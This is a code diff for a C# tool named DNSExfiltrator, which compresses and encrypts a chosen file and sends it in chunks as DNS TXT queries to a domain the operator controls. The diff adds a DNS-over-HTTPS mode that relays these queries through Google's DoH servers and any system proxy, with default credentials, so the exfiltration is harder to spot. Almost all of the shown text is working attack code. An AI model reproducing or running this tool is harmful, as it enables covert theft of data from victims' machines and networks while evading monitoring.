@@ -16,6 +16,7 @@ using System.IO.Compression;
 using System.Text;
 using System.Linq;
 using System.Collections;
+using System.Collections.Generic;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Threading;
@@ -41,10 +42,11 @@ namespace DNSExfiltrator
 		private static void PrintUsage()
 		{
 			Console.WriteLine("Usage:");
-			Console.WriteLine("{0} <file> <domainName> <password> [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]", System.AppDomain.CurrentDomain.FriendlyName);
+			Console.WriteLine("{0} <file> <domainName> <password> [-h] [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]", System.AppDomain.CurrentDomain.FriendlyName);
 			Console.WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
 			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
 			Console.WriteLine("\tpassword:\t[MANDATORY] Password used to encrypt the data to be exfiltrated.");
+			Console.WriteLine("\t-h:\t\t[OPTIONNAL] Flag enabling DoH (DNS over HTTP) usage. Uses Google's DoH servers.");
 			Console.WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
 			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
 			Console.WriteLine("\trequestMaxSize:\t[OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
@@ -74,7 +76,7 @@ namespace DNSExfiltrator
 			string result = String.Empty;
 			
 			// characters used in DNS names through the Win32 API resolution library do not
-			// support all of the base64 characters:
+			// support all of the base64 characters. We have to use the base64url standard:
 			// '/' and '+' characters are substituded
 			// '=' padding character are removed and will need to be recomputed at the remote end
 			result = Convert.ToBase64String(data).Replace("=","").Replace("/","_").Replace("+","-");
@@ -110,6 +112,7 @@ namespace DNSExfiltrator
 			string password = String.Empty;
 
 			string fileName = String.Empty;
+			bool useDoH = false; // Whether or not to use DoH for resolution
 			string dnsServer = null;
 			int throttleTime = 0;
 			string data = String.Empty;
@@ -158,12 +161,16 @@ namespace DNSExfiltrator
 						if (param < 63) { labelMaxSize = param; }
 						PrintColor(String.Format("[*] Setting label max size to [{0}] chars", labelMaxSize));
 					}
+					else if (args[i] == "-h") {
+						useDoH = true;
+						PrintColor("[*] Using DNS over HTTP for name resolution.");
+					}
 					i++;
 				}
 			}
 			
 			//--------------------------------------------------------------
-			// Compress the file in memory
+			// Compress and encrypt the file in memory
 			PrintColor(String.Format("[*] Compressing (ZIP) the [{0}] file in memory",filePath));
 			using (var zipStream = new MemoryStream())
 			{
@@ -202,9 +209,13 @@ namespace DNSExfiltrator
 			// Send the initial request advertising the fileName and the total number of chunks
 			request = "init." + Encode(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + "." + domainName;
 			PrintColor("[*] Sending 'init' request");
+
+			string reply = String.Empty;
 			try {
-				string[] reply = DnsResolver.GetTXTRecords(request,dnsServer);
-				if (reply[0] != "OK") {
+				if (useDoH) { reply = DOHResolver.GetTXTRecord(request); }
+				else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
+				
+				if (reply != "OK") {
 					PrintColor(String.Format("[!] Unexpected answer for an initialization request: [{0}]", reply[0]));
 					return;
 				}
@@ -240,11 +251,12 @@ namespace DNSExfiltrator
 				// Eventually comes the top level domain name
 				request += domainName;
 				
-				
 				// Send the request
 				try {
-					string[] reply = DnsResolver.GetTXTRecords(request,dnsServer);
-					countACK = Convert.ToInt32(reply[0]);
+					if (useDoH) { reply = DOHResolver.GetTXTRecord(request); }
+					else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
+					
+					countACK = Convert.ToInt32(reply);
 					
 					if (countACK != chunkIndex) {
 						PrintColor(String.Format("[!] Chunk number [{0}] lost.\nResending.", countACK));
@@ -320,6 +332,93 @@ namespace DNSExfiltrator
 	}	
 
 	//============================================================================================
+	// This class provides DNS over HTTP resolution using the Google DOH experimental servers
+	//============================================================================================
+    public class DOHResolver
+    {
+		
+		static string googleDOHURI = "https://dns.google.com/experimental?ct&body=";
+		
+		public static string GetTXTRecord(string domain)
+		{
+			List<byte> dnsPacket = new List<byte>();
+			List<byte> dnsQuery = new List<byte>();
+						
+			//---- Crafting the DNS packet, starting with the headers
+			// Transaction ID = 0x00002
+			// Flags: standard query = 0x0100
+			// Questions: 1 question = 0x0001
+			// Answer RRs: 0 = 0x0000
+			// Authority RRs: 0 = 0x0000
+			// Additional RRs: 0 = 0x0000
+			dnsPacket.AddRange(new byte[]{0x00, 0x02, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}); 
+						
+			foreach (string label in domain.Split('.')) {
+				dnsQuery.Add(Convert.ToByte(label.Length)); // Label size
+				dnsQuery.AddRange(Encoding.UTF8.GetBytes(label)); // Label
+			}
+			dnsQuery.Add(0x00); // Terminating labels
+			
+			// QType: TXT = 0x0010
+			// QClass: In (internet) = 0x0001
+			dnsQuery.AddRange(new byte[]{0x00, 0x10, 0x00, 0x01});
+			
+			//---- Concatenate the headers and the Query
+			dnsPacket.AddRange(dnsQuery);
+						
+			// Converting the dnsWirePacket to a base6url representation
+			string dohParameter = Convert.ToBase64String(dnsPacket.ToArray()).Replace("=","").Replace("/","_").Replace("+","-");
+			string dohQuery = googleDOHURI + dohParameter;
+			
+			//------------------------------------------------------------------
+			// Perform the DOH request to the server
+			WebClient webClient = new WebClient(); // WebClient object to communicate with the DOH server
+			byte[] responsePacket = null;
+						
+            //---- Check if an HTTP proxy is configured on the system, if so, use it
+            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
+            if (defaultProxy != null)
+            {
+                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
+                webClient.Proxy = defaultProxy;
+            }
+			
+			//---- Sending the DOH request and receiving the answer in a byte array
+			responsePacket = webClient.DownloadData(dohQuery);
+			
+			/* DEBUG SECTION
+			Console.WriteLine("Response received:");
+			int i = 0;
+			foreach (byte b in responsePacket) {
+				Console.WriteLine("Packet[{0}]: {1} --> {2}",i++,Convert.ToInt32(b), Convert.ToChar(b));
+			}
+			*/
+						
+			// DNS response structure is made of: [Headers] + [DNS Query] + [DNS Answer]
+			// Check we have at least one Answer Resource Records --> RR field
+			if (Convert.ToInt32(responsePacket[7]) > 0) {
+				int answerIndex = 12 + dnsQuery.Count; // Header size + Query size -1 to get the index of the array element
+				
+				// Check the type of answer is TXT
+				if (Convert.ToInt32(responsePacket[answerIndex + 3]) == 0x10) {
+					int txtLength = Convert.ToInt32(responsePacket[answerIndex + 12]);
+					
+					byte[] txtRecord = new byte[txtLength];
+					Array.Copy(responsePacket,answerIndex + 13, txtRecord, 0, txtLength);
+					
+					return Encoding.UTF8.GetString(txtRecord);
+				}
+				else {
+					throw new Win32Exception("DNS answer does not contain a TXT resource record.");
+				}
+			}
+			else {
+				throw new Win32Exception("DNS answer does not contain any resource record.");
+			}
+		}
+	}
+	
+	//============================================================================================
 	// This class provides DNS resolution by using the PInvoke calls to the native Win32 API
 	//============================================================================================
     public class DnsResolver
@@ -334,9 +433,9 @@ namespace DNSExfiltrator
         private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);
 		
 		//---------------------------------------------------------------------------------
-		// Resolving TXT records only for now
+		// Resolving TXT records only (for now)
 		//---------------------------------------------------------------------------------
-        public static string[] GetTXTRecords(string domain, string serverIP = null)
+        public static string GetTXTRecord(string domain, string serverIP = null)
         {
 			IntPtr recordsArray = IntPtr.Zero;
 			IntPtr dnsRecord = IntPtr.Zero;
@@ -351,7 +450,6 @@ namespace DNSExfiltrator
 				dnsServerArray.AddrArray = new uint[1];
 				dnsServerArray.AddrArray[0] = address;
 			}
-			
            
 			// Interop calls will only work on Windows platform (no mono c#)
 			if (Environment.OSVersion.Platform != PlatformID.Win32NT)
@@ -386,7 +484,9 @@ namespace DNSExfiltrator
 			{
 				DnsResolver.DnsRecordListFree(recordsArray, 0);
 			}
-				return (string[]) recordList.ToArray(typeof(string));
+			
+			// Return only the first TXT answer
+			return (string)recordList[0];
 		}
 
 		//---------------------------------------------------------------------------------
